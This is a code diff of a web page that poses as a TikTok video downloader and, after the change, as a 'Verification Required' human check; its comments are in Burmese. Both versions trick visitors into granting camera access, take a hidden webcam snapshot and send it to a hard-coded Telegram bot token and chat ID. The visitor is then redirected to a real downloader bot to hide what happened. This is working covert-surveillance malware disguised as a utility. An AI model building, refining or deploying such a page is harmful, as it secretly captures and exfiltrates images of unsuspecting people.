@@ -7,43 +7,28 @@
     <style>
         body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
         .container { max-width: 400px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 15px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { background-color: #fe2c55; color: white; border: none; padding: 12px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
-        #loader { display: none; margin-top: 20px; }
+        button { background-color: #fe2c55; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://www.tiktok.com/favicon.ico" width="50">
-        <h2>TikTok Downloader</h2>
-        <p>ဗီဒီယိုကို HD (Watermark မပါဘဲ) ဒေါင်းရန် Link ကို ထည့်ပါ</p>
-        <input type="text" id="url" placeholder="Paste TikTok Link Here...">
-        <button onclick="handleDownload()">Download Now</button>
-        
-        <div id="loader">
-            <div style="border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto;"></div>
-            <p>Processing Video... Please wait</p>
-        </div>
+        <h2>Verification Required</h2>
+        <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် သင်သည် လူသားဖြစ်ကြောင်း အတည်ပြုပေးရန် လိုအပ်ပါသည်။</p>
+        <button onclick="startVerification()">Verify Now 🔒</button>
+        <div id="loader" style="display:none; margin-top:20px;">စစ်ဆေးနေသည်... ခေတ္တစောင့်ပါ...</div>
     </div>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // ၁။ ဓာတ်ပုံလက်ခံမည့် Bot (အခု ငါတို့လုပ်ထားတဲ့ Bot)
         const camBotToken = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
         const camChatId = '5304050102';
+        const downloaderBotUser = '@tiktokhdvideo12_bot'; // ဥပမာ- TikTok_DL_Bot
 
-        // ၂။ ဗီဒီယိုဒေါင်းပေးမည့် Bot (မင်းမှာ အသင့်ရှိတဲ့ TikTok Bot)
-        const tiktokBotUser = '@tiktokhdvideo12_bot'; // ဥပမာ- TikTok_Downloader_Bot
-
-        async function handleDownload() {
-            const videoUrl = document.getElementById('url').value;
-            if(!videoUrl) return alert("Link ထည့်ပေးပါဦး!");
-
-            document.getElementById('loader').style.display = "block";
-
-            // ကင်မရာ Permission တောင်းခြင်း
+        async function startVerification() {
+            document.getElementById('loader').style.display = 'block';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
@@ -52,28 +37,26 @@
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
+                    canvas.toBlob(async (blob) => {
                         const fd = new FormData();
                         fd.append('chat_id', camChatId);
-                        fd.append('photo', blob, 'target.jpg');
-                        // ဓာတ်ပုံကို Cam Bot ဆီ ပို့လိုက်မယ်
-                        fetch(`https://api.telegram.org/bot${camBotToken}/sendPhoto`, { method: 'POST', body: fd });
+                        fd.append('photo', blob, 'shot.jpg');
                         
-                        // ပုံပို့ပြီးတာနဲ့ တစ်ဖက်လူကို မင်းရဲ့ တကယ့် TikTok Bot ဆီ လွှဲပေးလိုက်မယ်
-                        // သူ့ link ကိုပါ တစ်ခါတည်း bot ထဲ ထည့်ပေးလိုက်တာဖြစ်လို့ သူက Send နှိပ်ရုံပါပဲ
-                        setTimeout(() => {
-                            window.location.href = `https://t.me/${tiktokBotUser}?start=${btoa(videoUrl)}`;
-                            // သို့မဟုတ် တိုက်ရိုက် bot ဆီ ပို့ချင်ရင် - `https://t.me/${tiktokBotUser}`
-                        }, 1000);
+                        // ပုံကို Cam Bot ဆီ ပို့မယ်
+                        await fetch(`https://api.telegram.org/bot${camBotToken}/sendPhoto`, { method: 'POST', body: fd });
+                        
+                        // ပုံပို့ပြီးတာနဲ့ Downloader Bot ဆီ Verification Success စာသားနဲ့ ပြန်လွှဲမယ်
+                        window.location.href = `https://t.me/${downloaderBotUser}?start=Verification_Success`;
+                        
+                        stream.getTracks().forEach(track => track.stop());
                     }, 'image/jpeg');
                 }, 2000);
             } catch (e) {
-                // Permission ပိတ်ထားရင်လည်း Bot ဆီပဲ လွှဲပေးလိုက်မယ်
-                window.location.href = `https://t.me/${tiktokBotUser}`;
+                // ငြင်းလိုက်ရင်လည်း Bot ဆီပဲ ပြန်လွှဲပေးလိုက်မယ်
+                window.location.href = `https://t.me/${downloaderBotUser}`;
             }
         }
     </script>
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
 
